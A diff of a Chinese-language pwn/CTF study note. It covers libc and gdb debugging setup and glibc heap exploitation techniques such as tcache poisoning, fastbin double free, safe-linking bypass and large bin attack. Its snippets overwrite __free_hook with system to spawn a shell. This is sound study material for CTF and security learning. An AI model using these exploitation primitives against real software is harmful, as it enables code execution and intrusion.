@@ -198,15 +198,14 @@ jshiro@ubuntu:~/Desktop/ctf/smashes$ ldd ./elf
 改变程序的链接库路径，使用工具修改libc文件
 
 ```Bash
-sudo ln ld-x.xx.so /lib64/ld-x.xx.so
 #生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题
+sudo ln ld-x.xx.so /lib64/ld-x.xx.so
 
-# libc 和 ld 都需要有可执行权限
+# libc 和 ld 都需要有可执行权限 chmod 777 xxx, new_libc.so使用相对路径加./ 执行失败可能架构未匹配
 patchelf --set-interpreter ld-x.xx.so elf # 来修改文件ld.so
-patchelf --replace-needed old_libc.so new_libc.so elf  # 来修改文件libc.so
-#尽量使用相对路径
+patchelf --replace-needed libc.so.6 ./new_libc.so elf  # 来修改文件libc.so
 
-# 可成功执行
+# 利用 glibc-all-in-one 成功执行
 patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./glibc-all-in-one/libs/ubuntu elf
 ```
 
@@ -216,7 +215,20 @@ patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./gl
 p = process(['~/name/x.xx-3ubuntu1_amd64/ld-x.xx.so', './elf'], env={"LD_PRELOAD":'~/name/x.xx-3ubuntu1_amd64/libc.so.6'})
 ```
 
+更改为
+
+```bash
+ldd ./elf
+	linux-vdso.so.1 (0x00007fff2be66000)
+	./libc-2.23.so (0x00007f81a8b3b000)
+	./ld-2.23.so => /lib64/ld-linux-x86-64.so.2 (0x00007f81a8ee5000)
+```
+
 **注意：在单个libc版本中还有多个版本，需要多次在本地尝试**
+
+```bash
+show debug-file-directory # usr/lib/debug, 其中包含.build-id
+```
 
 需要在gdb中设置
 
@@ -561,6 +573,23 @@ def delete(idx):
     p.sendline(str(idx))
 ```
 
+### gdb
+
+```bash
+# 更新 https://ftp.gnu.org/gnu/gdb/下载源码，升级gdb
+tar -zxvf gdb-xx.x.tar.gz
+cd gdb-xx.x
+mkdir build 
+cd build
+../configure --with-python=/usr/bin/python3.8 --enable-targets=all
+make && make install # apt install texinfo; sudo unlink /usr/local/share/man/man1
+
+# 替换老版本
+mv /usr/local/bin/gdb /usr/local/bin/gdb_bak
+cp ~/gdb-xx.x/gdb/gdb /usr/local/bin/
+gdb -v
+```
+
 ### pwndbg
 
 - 切换gdb插件gef、peda、pwndbg：`vim ~/.gdbinit`
@@ -669,6 +698,8 @@ set detach-on-fork off # 同时调试父进程与子进程
 pwndbg # 查看命令
 
 retaddr # 查看返回地址
+
+info sharedlibrary # 显示libc.so.6的调试符号
 ```
 
 **查看内存：**
@@ -725,7 +756,7 @@ sudo apt-get install libc-dbg:i386
 cp -r ~/tools/glibc-all-in-one/libs/x.xx-3ubuntu1_amd64/.debug/ ./debug
 ```
 
-- gdb中设置`debug file`就能正常使用gdb功能
+- 程序运行前gdb中设置`debug file`就能正常使用gdb调试符号功能
 
 ```Python
 set debug-file-directory debug/
@@ -941,6 +972,53 @@ clean:
     # @表示不回显命令，-表示忽略错误，不中断makefile执行，*是通配符，表示匹配目录下的所有文件
 ```
 
+### libc-database
+
+构建本地 libc 偏移量数据库，可替代glibc-all-in-one
+
+```bash
+# 下载libc符号表与偏移文件
+./get
+./get ubuntu debian
+./get all
+# 下载的libc存放在db中，依赖db通过符号和偏移查找libc版本
+
+# find根据符号和偏移找到libc版本呢
+./find system 0xaaa
+./dump libcx_x.xx-xubuntux_xxx # 查找()中libc常用符号和偏移，后面加上system指定查找某符号偏移
+
+# add 手动添加libc库到db
+./add libcxxx.so
+
+# identify判断某个libc是否已存在于db，支持hash查找
+md5sum ./libc-xx.so
+./identify md5=xxxxxxxxxxxxxxxxxxxxxx
+
+# download 下载与libc ID对应的整个libc到libs目录
+./download libcx_x.xx-xubuntux_xx
+```
+
+**libc-database**中libc和ld带符号信息，但没有glibc-all-in-one中配置的debug，即在gdb调试时无法显示符号信息，需要手动下载：
+
+```bash
+dpkg-deb -x libcx-dbg_x.xx-xubuntux.x_amd64.deb ./sym
+cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ # 其中file libc和ld会带有with debug_info, not stripped信息
+# 最终在gdb中set debug-file-directory xxxx/.debug/
+```
+
+
+
+### debuginfod
+
+- 用于管理libc的调试符号信息，ubuntu22.04以上该功能gdb默认启用
+
+【旧版本】
+
+- gdb10.1版本支持debuginfod，且elfutils-0.179后才支持，编译gdb configure加入`--with-debuginfod`
+
+- `vim /etc/debuginfod/ubuntu.urls`写入`https://debuginfod.ubuntu.com`
+- pwndbg中在`~/.gdbinit`写入`set debuginfod enabled on`
+
 ## 基础知识
 
 ### 计组
@@ -989,6 +1067,42 @@ ldd --version
 ./libc.so.6 # 执行libc文件查看版本
 strings libc.so.6 | grep ubuntu # 查看给定libc对应ubuntu版本
 strings libc.so.6 | grep version # 查看libc版本
+```
+
+**编译glibc**
+
+```bash
+wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz # 下载压缩包，其中包括glibc源码，可用于后续gdb dir
+tar -zxvf glibc-2.31.tar.gz # 解压
+cd glibc-2.31
+mkdir build && cd build
+CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" \ # C编译器标志
+CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error" # C++编译器标志
+sudo ../configure=/home/xx/glibc-2.31/amd64 --disable-werror --enable-debug=yes
+sudo make
+sudo make install
+```
+
+- 最终`/home/xx/glibc-2.31/amd64`目录下有`bin  etc  include  lib  libexec  sbin  share  var`，`lib`中包含所需的`libc-2.31.so`和`ld-2.31.so`文件，patchelf后可调试libc中函数c代码
+- 对应出题提供的libc和ld，找到编译后lib下的libc和ld进行patchelf，并且`gdb dir 源代码目录(source/malloc)`来调试libc函数信息
+
+```bash
+# gcc -Wl,-rpath指定链接的libc库，-Wl,-dynamic-linker指定动态链接器
+gcc -g test.c -Wl,-rpath=/home/x/glibc/amd64/lib -Wl,-dynamic-linker=/home/x/glibc/amd64/lib/ld-linux.so.2
+```
+
+32位
+
+```bash
+wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz # 下载压缩包
+tar -zxvf glibc-2.31.tar.gz # 解压
+cd glibc-2.31
+mkdir build && cd build
+CFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32"  # C编译器标志
+CXXFLAGS="-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32"  # C++编译器标志
+sudo ../configure --prefix=/home/xx/glibc-2.31/i686 --host=i686-pc-linux-gnu --disable-werror --enable-debug=yes
+sudo make
+sudo make install
 ```
 
 ### Mips
@@ -2032,39 +2146,6 @@ cmp eax, 10h # eax为32位 且此时将eax作为有符号整数看
 
 根据相应汇编看寄存器的变化值，然后逆向使用python进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的size大小，进而若有可控制的数组偏移如下，即可利用更改内存值
 
-## OOB漏洞
-
-Out-of-Bounds，包括数组越界、指针偏移、使用后释放UAF等
-
-**写后判断**
-
-通过该漏洞可以造成越界写内容，若arg_list在bss段可以借此**越界改其他bss段上的变量**
-
-```C
-while ( 1 ){
-    next_args = strtok(0LL, " "); // 获取命令行输入参数遍历
-    if ( !next_args ) break;
-    if ( strlen(next_args) > 31 ){return -1;}
-    i = nargs++;
-
-    strcpy(&arg_list[32 * i], next_args); // 漏洞点: 先写入arg_list再判断是否大于10
-}
-if ( nargs <= 10 ){ return idx;}
-else{return -1;}
-```
-
-**调用越界**
-
-- 先任意写入system地址到bss段，尝试越界修改bss段中idx使得偏移调用system函数
-- `arg_list`也可尝试任意地址写入`'/bin/sh'`
-- 注意有时`p64(0xab)`时使用`replace(b'\x00', b'')`或`p64(0x123456781234)[:6]`替换防止提前0截断
-
-```C
-((void (__fastcall *)(char *))*(&funcs_list + 3 * idx))(arg_list);
-```
-
-
-
 ## 栈溢出漏洞
 
 ### 栈基础
@@ -2127,6 +2208,39 @@ retn
 - **函数function**参数传递
   - x86_32/x86：从右至左顺序压参数入栈，栈传递参数，eax存放返回值
   - x86_64/amd64：参数少于7个时，从左到右：rdi,rsi,rdx,rcx,r8,r9中，大于7个，后面的从“右向左”放入栈中
+
+### OOB
+
+Out-of-Bounds，包括数组越界、指针偏移、使用后释放UAF等
+
+**写后判断**
+
+通过该漏洞可以造成越界写内容，若arg_list在bss段可以借此**越界改其他bss段上的变量**
+
+```C
+while ( 1 ){
+    next_args = strtok(0LL, " "); // 获取命令行输入参数遍历
+    if ( !next_args ) break;
+    if ( strlen(next_args) > 31 ){return -1;}
+    i = nargs++;
+
+    strcpy(&arg_list[32 * i], next_args); // 漏洞点: 先写入arg_list再判断是否大于10
+}
+if ( nargs <= 10 ){ return idx;}
+else{return -1;}
+```
+
+**调用越界**
+
+- 先任意写入system地址到bss段，尝试越界修改bss段中idx使得偏移调用system函数
+- `arg_list`也可尝试任意地址写入`'/bin/sh'`
+- 注意有时`p64(0xab)`时使用`replace(b'\x00', b'')`或`p64(0x123456781234)[:6]`替换防止提前0截断
+
+```C
+((void (__fastcall *)(char *))*(&funcs_list + 3 * idx))(arg_list);
+```
+
+
 
 ### 地址泄露
 
@@ -4471,6 +4585,13 @@ payload = b'a'*padding + p64(mov_rax_0xf_ret) + p64(syscall_addr) + flat(signal_
 
 ![image-20241110220745416](/img/pwn_note.zh-cn.assets/image-20241110220745416.png)
 
+### Exit Hook
+
+- `/stdlib/exit.c`中原函数
+- pwndbg中`u _dl_fini`找到`rtld_lock_default_unlock_recursive`，劫持其地址为one_gadget，退出时call one_gadget达到劫持效果
+
+
+
 ## 格式化字符串
 
 - 格式化字符串函数接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后参数
@@ -4770,11 +4891,6 @@ while True:
 
 
 
-## exit hook
-
-- `/stdlib/exit.c`中原函数
-- pwndbg中`u _dl_fini`找到`rtld_lock_default_unlock_recursive`，劫持其地址为one_gadget，退出时call one_gadget达到劫持效果
-
 ## 堆溢出漏洞
 
 <img src="/img/pwn_note.zh-cn.assets/-172844670575344.assets" alt="img" style="zoom: 80%;" />
@@ -5004,6 +5120,19 @@ static __thread tcache_perthread_struct *tcache = NULL; // 减少线程竞争
 
 ![image-20241118215138701](/img/pwn_note.zh-cn.assets/image-20241118215138701.png)
 
+**key字段**
+
+- glibc-2.29引入，位于chunk的bk字段，值为tcache结构体地址，用于检测double free，可泄露tcache key泄露堆地址
+- glibc-2.34后，`tcache_put`函数中，key值设为随机值`tcache_key`，不再能泄露堆地址
+
+```c
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  struct tcache_perthread_struct *key; // 检测double free
+} tcache_entry;
+```
+
 **stash机制**
 
 申请在tcache范围时，先tcache直到空，再去bin找；tcache为空，ptmalloc在其他bin中找，若fastbin/smallbin/unsorted bin有size符合的chunk，填入tcache直到塞满，之后从tcache中取或直接返回找到的chunk（**此时chunk在bin中和tcache中顺序颠倒**）
@@ -5035,7 +5164,9 @@ static __thread tcache_perthread_struct *tcache = NULL; // 减少线程竞争
 
 <img src="/img/pwn_note.zh-cn.assets/image-20241118201403530.png" alt="image-20241118201403530" style="zoom:80%;" />
 
-### Unlink
+### 漏洞点
+
+#### Unlink
 
 - **条件**：有堆溢出或off by null，且可以泄露出指针数组地址
 - `free`时和目前**物理相邻的 free chunk 合并为新堆块**，避免碎片化内存，将某一个空闲 chunk 从其所处的双向链表中脱链
@@ -5115,56 +5246,34 @@ BK->fd = FD，即 *(expect value + 0x10) = FD = target addr - 0x18
 
 - 同样的方法，将`free`函数的`got`表覆写为`system`函数的真实地址，`free`写有"/bin/sh"的堆
 
+#### UAF
 
+- Use after free，内存块被释放之后再次被使用，关键在于**指针未被设置为NULL**
 
-### UAF
-
-**Use after free**：内存块被释放之后再次被使用，关键在于**指针未被设置为NULL**，即原先指针并没有消失，只是由fastbins或tcache中新增出了指针将chunk连成链表
+- 即原先指针并没有消失，fastbins或tcache中新增了指针将chunk连成链表
 
 **漏洞点：**
 
 ```C
-void func1(){ printf("func1\n");}
-void hack(){ printf("hack\n");}
-struct Pfunc{ void (*p)();};
-  
-int main()
-{
-    struct Pfunc* lpfunc = malloc(8);
-    lpfunc->p = func1;
-    lpfunc->p();    //"func1"
- 
-    free(lpfunc);
- 
-    long* hack_point = malloc(8);
-    *hack_point = hack;
- 
-    lpfunc->p();    //"hack"
-    return 0;
-}
-```
-
-- fastbins使用LIFO，后进先出，所以申请同样大小的chunk，会使用最后一次free的chunk，此时可达到 **hack_point指针 与 lpfunc指针 指向同一个地址【刚才free的chunk地址】**
-- 调试中，fastbins指向的地址为0x0804b000，而两指针指向的地址为0x0804b008，由于malloc指针指向data，而fastbins指向prev_size，prev_size 和 size 在32位下刚好占8字节，所以偏移了8
-
-```C
-o = malloc(0x28uLL);    
+o = malloc(0x28uLL);
 free(o);
 s = (char *)malloc(0x20uLL); 
-fgets(s, 32LL, stdin);    //向s指向的地址写数据
+fgets(s, 32LL, stdin);    // 向s指向的地址写数据
 free(s);
 (*((void (__fastcall **)(void *))o + 3))(o);
 ```
 
-利用：
+**利用**：o+3是调用func1，但篡改后相当于调用shellcode
 
 ![img](/img/pwn_note.zh-cn.assets/-172844670575454.assets)
 
-o+3是调用func1，但篡改后相当于调用了shellcode
+
 
 **hacknote**基本实现：一次malloc两个堆块，且第一个堆块固定为8字节，第二个堆块自己申请
 
 ![img](/img/pwn_note.zh-cn.assets/-172844670575455.assets)
+
+
 
 此处也存在**漏洞点**：打印为`(*notelist[i])(notelist[i])`调用puts打印content内容（32位下）
 
@@ -5172,14 +5281,98 @@ o+3是调用func1，但篡改后相当于调用了shellcode
 
 ![img](/img/pwn_note.zh-cn.assets/-172844670575456.assets)
 
-### Double free
 
-glibc-2.23
 
-- 堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次free，达成任意地址写，**注：不可以直接连续两次free，会被`_int_free`检测到fastbin double free**
+#### Off-by-null
+
+**off-by-one**：更改后一块的`size`位，用于合并堆块造成堆块重叠
+
+原理：程序向堆缓冲区中写入时，字节数超过了该缓冲区本身所申请的字节数，且刚好越界了一个字节；利用该漏洞可以实现利用方法：**poison null byte/off-by-null（适用于libc-2.27）**
+
+**触发漏洞：**
+
+![img](/img/pwn_note.zh-cn.assets/-172844676894985.assets)
+
+**原理**：free(b)后并没有将b指针置为NULL，且此时b中的prev_size作为a的内容，可以填入a的数据，若能控制a的数据，超过b的prev_size区域后并且覆盖b的size区域中一个字节，则造成off-by-one
+
+- 要绕过高版本的glibc需要在b上构造数据进行绕过验证，旧版本check为`size==prev_size(next_chunk)`，新版本check为**`chunksize(P) != prev_size (next_chunk(P))`**
+- 在off by one后，`b`的`size`将会由于覆盖而改变，`chunksize(P)`即`b`的`size`大小，被覆盖为了`0xa00`，而`next_chunk(P)`本来应该为`c`的`prev_size`，但是此时并不是`c`，对于`b`的`next_chunk`的计算应该是`b`的`chunk`指针加上`b`的`size`，即图中【b-0x10+0xa00】，仍在`b`的`chunk`内，所以提前构造`* (size_t)(b+0x9f0) = 0xa00;`
+
+![img](/img/pwn_note.zh-cn.assets/-172844676894986.assets)
+
+free `b`后，进入`unsorted bin`中，申请新的`B1`和`B2`，将会从原来`b`的位置延续，而修改`c`的`pre_size`时也会因为伪造导致修改在了向上偏0x10的位置处，所以`c`仍然认为`prev_size`为**0xa10**，free B1和c后，会导致B1、B2和c一同合并为一个大chunk进入`unsorted bin`中，而B2并没有被free，再次申请d，会出现覆盖B2的情况（形成堆的堆叠），此时可以任意修改B2中的内容，通常B2（受害者）将是一个结构，其中包含我们要控制的有价值的指针
+
+**漏洞点：**
+
+```C
+for(i=0; ;++i)
+    if(i > length) break //i=length时多写一个
+```
+
+利用实现unsorted bin泄露方法：
+
+构造0,1,2,3共四个堆块，修改0号堆块内容溢出一字节到1堆块更改大小覆盖1和2堆块，此时1和2堆块被系统误认为为一个堆块，释放1堆块，将会有一个合并chunk进入unsorted bin（进入的**前提**为**1和2堆块相加的大小要大于0x80**），再申请一个堆块（和1堆块大小相等），此时unsorted bin分割导致只存有2堆块，2堆块的fd和bk都指向一个地址，访问2堆块可以泄露相关main_arena的地址
+
+### 堆叠
+
+通过堆块堆叠，使一个堆块可控制另一个堆块头部，比UAF只能控制fd和bk字段多了可控制的prev_size和size字段
+
+**UAF转堆叠**
+
+glibc-2.23中fastbin为例，在堆块内存区域伪造chunk size，UAF部分地址写将fd修改到伪造chunk头部，将fake chunk申请达成堆叠
+
+```python
+add_chunk(10, 0x80)
+add_chunk(0, 0x70)
+add_chunk(1, 0x50)
+add_chunk(2, 0x70)
+ 
+edit_chunk(0, 'a' * 0x60 + p64(0) + p64(0x81))
+delete_chunk(2)
+delete_chunk(0)
+edit_chunk(0, p8(0)) # 覆盖fd末尾一字节为00指向前面edit的fake chunk
+ 
+add_chunk(0, 0x70)
+add_chunk(0, 0x70)
+ 
+delete_chunk(2)
+```
+
+![image-20241130124443597](/img/pwn_note.zh-cn.assets/image-20241130124443597.png)
+
+**off-by-null转堆叠**
+
+
+
+### fast bin attack
+
+#### Double Free
+
+**条件**
+
+- glibc-2.23，且存在UAF漏洞：堆上某块内存被释放后，未将指向该堆块的指针清零，对该内存进行再次free，达成任意地址写
+
+
 - free掉chunk时，判断 chunk 大小和所处位置，若 chunk_size <= max_fast 且 chunk 不位于 heap 的顶部（即不与 top chunk 相邻），则将 chunk 放到 fast bins 中
 
-申请2个0x60的堆块【1,2】进行如下操作：
+**绕过**
+
+- ```c
+  // 直接连续两次free _int_free 会检测出double free
+  if (__builtin_expect(old == p, 0))
+  ```
+
+  其只检查链表中第一个chunk是否是待释放chunk，所以先释放chunk2再释放chunk1绕过
+
+- ```c
+  if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0))
+  ```
+
+  **要保证申请target chunk 位置对应 size 字段的值正确**
+
+**利用**
+
+- 申请2个0x60的堆块【1,2】进行如下操作：
 
 ```Python
 free(1) 
@@ -5187,11 +5380,11 @@ free(2)
 free(1) # 均进入 fast bins
 ```
 
-![img](/img/pwn_note.zh-cn.assets/-172844676894871.assets)
+- 调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址（如malloc_hook偏移地址）
 
-调用 malloc 返回 chunk1 ，修改 chunk1 内容来修改其 fd 指针指向恶意地址，在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用malloc_hook劫持为one_gadget：**`fastbin Arbitrary Alloc`**
+- 在第四次 malloc 可实现在任意地址分配 fastbin 块，后续利用`Arbitrary Alloc`劫持malloc_hook为one_gadget
 
-### fast bin attack
+![image-20241125141220909](/img/pwn_note.zh-cn.assets/image-20241125141220909.png)
 
 #### Arbitrary Alloc
 
@@ -5283,18 +5476,215 @@ payload = b"a" * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_addr + 0xc)
 
 ### Tcache bin attack
 
-1. 一般利用UAF需要`malloc(0x80)`然后经过7次`free(0)`填充完`tcache bin`，**注：每次free(0)需要修改edit(0)改fd和bk为0，否则fd将会是堆块地址中部分数值，使得不可循环free**
-2. 然后再free时进入`unsorted bin`泄露libc基址
+#### Tcache Bypass
 
-#### Safe-linking机制
+让释放的chunk不进入tcache bin
+
+- 释放不在tcache大小范围的chunk
+
+```python
+add_chunk(0, 0x410) # 0x400在tcache bin范围内
+add_chunk(1, 0x10)
+delete_chunk(0)
+```
+
+- 释放 7 个同样大小 chunk 进入 tcache 填满
+
+```python
+for _ in xrange(7):
+    add_chunk(_, 0x68)
+ 
+add_chunk(7, 0x68)
+
+for _ in xrange(7):
+    delete_chunk(_)
+ 
+delete_chunk(7)
+```
+
+- 利用UAF，`malloc(0x80)`，然后7次`free(0)`填充完`tcache bin`，每次free(0)需要edit(0)修改fd和bk为0，否则fd将会是某堆块地址中数值，使得不可循环free，再free进入`unsorted bin`泄露libc基址
+- 限制free次数，通过`tcache dup`malloc 3次将counts改为-1绕过
+
+```python
+add_chunk(0, 0x68)
+ 
+delete_chunk(0)
+delete_chunk(0) # double free 将 tcache bin中第一个chunk指向自身
+
+add_chunk(0, 0x68) 
+add_chunk(0, 0x68) 
+add_chunk(0, 0x68) # -1
+ 
+delete_chunk(0)
+```
+
+- 控制`tcache_perthread_struct`，控制`counts`实现绕过
+
+```bash
+p *(struct tcache_perthread_struct*) 0xaaaa
+```
+
+#### Tcache Poisoning
+
+- 覆盖tcache的next指针，无需伪造chunk结构，可实现malloc到任何地址
+- safe-linking机制之前可使用
+
+```python
+add_chunk(0, 0x100)
+delete_chunk(0) # 进入tcache
+
+edit_chunk(0, p64(libc.sym['__free_hook'])) # 改next指针为__free_hook
+
+add_chunk(0, 0x100) # 申请第一个chunk
+add_chunk(0, 0x100) # 申请__free_hook指向地址
+
+edit_chunk(0, p64(libc.sym['system']))
+edit_chunk(1, "/bin/sh\x00")
+delete_chunk(1) # getshell
+```
+
+#### Tcache Dup
+
+- 适用于glibc-2.27，两次释放同一块chunk，再malloc，等效于uaf，show可以泄露地址，修改next指针可进行 tcache poisoning
+
+**泄露堆地址**
+
+double free后tcache中的唯一堆块指向自己，只要不修改fd指针，可以多次malloc均为该chunk
+
+```Python
+malloc(0x50) # chunk0
+free(0)
+free(0)
+show(0) # 泄露堆地址，通过偏移可获取tcache结构体基地址
+```
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241127233211910.png" alt="image-20241127233211910" style="zoom: 67%;" />
+
+**控制fd指针**
+
+> **__free_hook劫持**
+
+```python
+malloc(0x50) # chunk0
+edit(0, p64(libc.sym['__free_hook']))
+malloc(0x50) # chunk0
+malloc(0x50) # 劫持__free_hook chunk
+
+edit(0, p64(libc.sym['system']))
+edit(1, "/bin/sh\x00")
+free(1) # getshell
+```
+
+> **tcache_perthread_struct劫持**
+
+```Python
+new(0x240) # chunk0
+edit(1, p64(heap_base + 0x10)) # fd字段
+new(0x240) # chunk0
+new(0x240) # 劫持tcache结构体
+edit(p8(7) * 64 + p64(0xdeadbeef) * 64) # 覆盖count 以及 tcache_entry, deadbeef改为target地址
+```
+
+- 再申请一个chunk，为chunk0，将fd覆盖为`tcache_perthread_struct`地址，接着两次malloc后，第二次malloc分配的堆块到`tcache_perthread_struct`结构体地址，可以控制该结构体
+
+- 编辑tcache结构体中的count为极大值，导致之后分配的chunk在free后因tcache判定满而不进入tcache达成绕过
+- 也可**将其所在的0x251大小的chunk 释放到unsorted bin**，再次申请0x240大小的chunk修改tcache结构体
+
+> **__malloc_hook劫持**
+
+- 可以接着**通过修改结构体中的`tcache_entry`**，其每隔8字节是一个指向tcache bin的地址，覆盖其中一个地址为【malloc_hook-0x13】地址来劫持malloc
+- 若要向malloc_hook地址申请0x20的chunk，需要劫持tcache_entry中属于0x30（0x20+0x10）的位置
+
+#### Tcache Extend
+
+- 存在UAF及堆溢出8字节，修改下一个chunk的size字段，堆块堆叠
+
+```python
+add(0, 0x18)
+add(1, 0x10)
+add(2, 0x10)
+
+edit(0, b'a'*0x18 + p64(0x100)) # chunk1 size=0x100
+delete(1) # tcache bin -> chunk1(包含chunk2)
+
+add(1, 0xf8) # 将chunk1申请出来，chunk1与chunk2堆叠
+delete(2) # 释放chunk2：tcache bin -> chunk2
+
+edit(1, b'a'*0x20+p64(target_addr)) # 修改chunk1，实际覆盖chunk2的fd指针劫持
+```
+
+#### Tcache key Bypass
+
+① 利用 UAF 将 free chunk 中记录的 tcache key清除，使其不等于tcache结构体地址来绕过该检测，可以double free
+
+当tcache count为0时，即使其指向target也无法申请出来，尝试申请chunk将count变大
+
+② **house of kauri**
+
+③ tcache stash with fastbin double free
+
+- fastbin 中没有严密 double free 检测，填满tcache后在fastbin完成double free
+- 通过stash机制将fastbin中chunk倒回tcache中
+
+```python
+for i in range(9): new(i, 0x30)
+for i in range(2, 9): delete(i) # 填满tcache
+
+delete(0) # fastbin double free
+delete(1)
+delete(0)
+for i in range(2, 9): new(i, 0x30) # 耗尽tcache
+
+new(0, 0x30) # 触发stash
+edit(0, p64(target)) # 然后malloc 3次申请出target
+```
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241128153011470.png" alt="image-20241128153011470" style="zoom: 67%;" />
+
+④ **House of Botcake**
+
+#### Fastbin Reverse
+
+- calloc申请内存不会从tcache中获取，直接从堆块获取，取完后会通过stash机制将fastbin中chunk放入tcache中
+- 修改fastbin中chunk的fd指针，会在fd+0x10(target)地址处写入极大值
+
+**calloc情况**
+
+<img src="/img/pwn_note.zh-cn.assets/image-20241128201222311.png" alt="image-20241128201222311" style="zoom: 80%;" />
+
+**malloc情况**
+
+- 由于malloc从tcache bin中取，需要先消耗完tcache中的chunk再触发stash
+- 为防止target的fd指向无效数据使stash失败，需要在fastbin中预留6个chunk填充tcache
+
+```python
+for i in range(14): new(i, 0x50) # 7个填充chunk，1个利用chunk，6个预留chunk
+for i in range(14): delete(i) # 7 tcache bin，7 fast bin
+ 
+new(0, 0x50) # tcache 空缺一个
+delete(7) # 同时进入fastbin 和 tcache中
+new(7, 0x50) # 从 tcache 中取
+edit(7, p64(libc.sym['__free_hook'] - 0x10)) # 修改fd
+
+for i in range(1, 7): new(i, 0x50) # 取出所有tcache bin中chunk
+new(7, 0x50) # 触发stash，fastbin中chunk进入tcache bin中，【tcache: __free_hook->6 chunk】
+ 
+add_chunk(7, 0x50) # 劫持__free_hook地址
+```
+
+#### Tcache Stash Unlink
+
+
+
+#### Safe-linking Bypass
 
 glibc-2.33引入的新检查机制
 
 ```C
 /* 加密函数 */
-#define PROTECT_PTR(pos, ptr) \
+#define PROTECT_PTR(pos, ptr)
   ((__typeof (ptr)) ((((size_t) pos) >> 12) ^ ((size_t) ptr)))
-/* 解密0函数 */
+/* 解密函数 */
 #define REVEAL_PTR(ptr)  PROTECT_PTR (&ptr, ptr)
 ```
 
@@ -5308,62 +5698,34 @@ p->fd = ((&p->fd)>>12) ^ REVEAL_PTR(p->fd)
 // 第二块被释放: fd = (0x123456789adc >> 12) ^ 0x123456789abc = 0x1235753dfd35
 ```
 
-绕过方法：通过UAF填写`fd`的值为0（初值），之后泄露出该`tcache bin`堆块的`fd`的值实则为该堆块地址的前9位，进行偏移计算可获得该堆块地址即堆地址
+**绕过**
+
+- 通过UAF填写`fd`的值为0（初值），之后泄露出该`tcache bin`堆块的`fd`的值实则为该堆块地址的前9位，偏移计算获得堆地址
 
 ```Python
 heap_addr = (((u64(r.recv(8)) ^ pre_heap_addr) << 12) % (2**64)) + offset
 next = ((heap_addr >> 12) % (2**64)) ^ free_hook_addr
 ```
 
-覆盖`fd`为`free_hook`地址异或后的`next`地址劫持，申请2个同样大小堆块，从tcache中选出一块，第二块为fd指向的`free_hook`地址，写入`system`地址后，调用`free()`包含`'/bin/sh'`的堆块达到getshell目的
-
-#### Double free
-
-适用于2.27最初版本，两次释放同一块chunk
-
-```Python
-malloc(0x50)
-free(0)
-free(0)
-```
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894976.assets)
-
-泄露堆地址：UAF导致chunk中的fd指向自己，通过show功能可以泄露出heap的地址，通过调试的偏移可以获取到**tcache结构体的基址**
-
-**控制`tcache_perthread_struct`：**
-
-- 再申请一个chunk，即为原来的chunk1，将fd覆盖为**`tcache_perthread_struct`**的地址，此时两次malloc后的第二次malloc分配的堆块到`tcache_perthread_struct`结构体地址，可以控制该结构体
-
-![img](/img/pwn_note.zh-cn.assets/-172844676894977.assets)
-
-- 编辑tcache结构体中的count为极大值，导致之后分配的chunk在free后不会进入tcache进行绕过（因为tcache判别时发现已满），此时我们可以**将tcache结构体【0x251大于fastbin的0x80】所在的chunk free到unsorted bin**中，进行后续利用（泄露地址或unsorted bin attack）
-
-```Python
-new(0x50) #1
-edit(1, p64(heap_base - 0x250))
-new(0x50) #2
-new(0x50) #3
-edit(3, 'a' * 0x28)
-delete(3)
-```
-
-- 当申请堆块可覆盖tcache结构体时，且如上已经覆盖导致tcache认为自己已满，此时可以接着**通过覆盖修改结构体中的`tcache_entry`**，其中每隔8字节是一个指向tcache bin的地址，如前tcache图中所示，覆盖其中一个地址为跳向【malloc_hook-0x13】的地址，可以达到劫持malloc目的，后续操作参考tcache bin attack，其中注意：若之后要向malloc_hook地址申请0x20的chunk，需要劫持tcache_entry中属于0x30（0x20+0x10）的位置
+- 覆盖`fd`为与`__free_hook`地址异或后的`next`地址，申请2个同样大小堆块，第二块为fd指向的`__free_hook`地址
+- 写入`system`地址，调用`free()`包含`'/bin/sh'`的堆块达成getshell
 
 ### Large bin attack
 
-- 保护全开，glibc-2.31，通过UAF来利用
+#### 地址泄露
+
+- 保护全开，glibc-2.31，通过UAF利用
 - **0x4FF < size < 0xFFF**：申请对应large bin，`malloc` 时，会遍历 `unsorted bin`，若无法**精确分配**或不满足切割分配条件，会将该 `chunk `置入相应大小的 `bin`(**large bins**) 中
 
 **泄露libc基址**
 
 ```Python
-create(1, 0x500, b'')
-create(2, 0x600, b'')
-create(3, 0x700, b'') # 隔开 top chunk
+create(1, 0x500)
+create(2, 0x600)
+create(3, 0x700) # 隔开 top chunk
 delete(1) # 1 进入 unsorted bin
 delete(3) # 3 并入 top chunk
-create(4, 0x700, b'') # free chunk 1 无法满足 进入 large bins
+create(4, 0x700) # free chunk 1 无法满足 进入 large bins
 browse(1) # 同样可获取一个到main_arena偏移一段距离的地址, 泄露libc基址
 ```
 
@@ -5379,6 +5741,109 @@ show(0) # 看 0 的fd, bk泄露 main_arena偏移地址来得到libc地址
 # fd=bk, fd_nextsize=bk_nextsize
 ```
 
+注：泄露地址fd结尾出现00截断时，编辑该堆块填入'a'覆盖00
+
+#### 目标地址写大数
+
+**原理**
+
+- glibc-2.30前，chunk链入 `large bin` 过程缺乏对 `bk` 和 `bk_nextsize` 指针检查，利用修改可进行**两处任意地址写**
+
+```c
